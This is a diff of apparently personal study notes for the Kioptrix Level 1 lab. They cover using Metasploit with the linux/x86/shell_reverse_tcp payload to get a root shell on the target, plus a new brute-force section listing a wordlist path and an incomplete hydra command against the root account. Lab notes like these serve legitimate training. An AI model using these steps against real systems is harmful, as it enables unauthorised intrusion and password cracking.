@@ -337,8 +337,8 @@ output:
     output: A list of Payloads 
  10. chose   set payload linux/x86/shell_reverse_tcp	
  11. run
- 12 when stop write whoami and the answer is root
-    write hostname the answer is kioptrix.level1
+ 12  write whoami and the answer is root
+     write hostname the answer is kioptrix.level1
 ==========================================================
  
  
@@ -352,7 +352,14 @@ outout :
    hostname: kioptrix.level1
    whoami:  apache    
 
+                ----------       Brute force attacks     -------------
   02:59:00 https://www.youtube.com/watch?v=sH4JCwjybGs
+  
+  ls -la  /usr/share/metasploit-framework/data/wordlists
+  hydra -l root -P /usr/share/wordlists/metasploit
+
+
+
 
  Demo Report
  --------------------
